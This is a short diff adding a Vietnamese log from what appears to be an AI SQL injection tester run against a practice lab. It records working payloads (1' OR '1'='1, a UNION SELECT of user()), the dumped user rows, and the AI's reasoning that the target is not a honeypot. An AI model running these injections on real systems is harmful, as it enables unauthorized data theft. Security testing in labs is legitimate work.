@@ -1,0 +1,5 @@
+SQL Injection — AI Self-Validation hoàn tất.
+      - Payload tốt nhất   : 1' OR '1'='1
+      - Mục đích           : Classic OR Auth Bypass
+      - Output trích xuất  : ID: 1' OR '1'='1First name: adminSurname: admin | ID: 1' OR '1'='1First name: GordonSurname: Brown | ID: 1' OR '1'='1First name: HackSurname: Me | ID:
+      - AI Reasoning       : Từ kết quả của payload '1' UNION SELECT null, user()#', output chứa 'Surname: app@localhost', đây là bằng chứng trực tiếp về việc truy xuất dữ liệu hệ thống. Hơn nữa, các thử nghiệm khác không cho thấy dấu hiệu của honeypot hoặc mồi nhử.
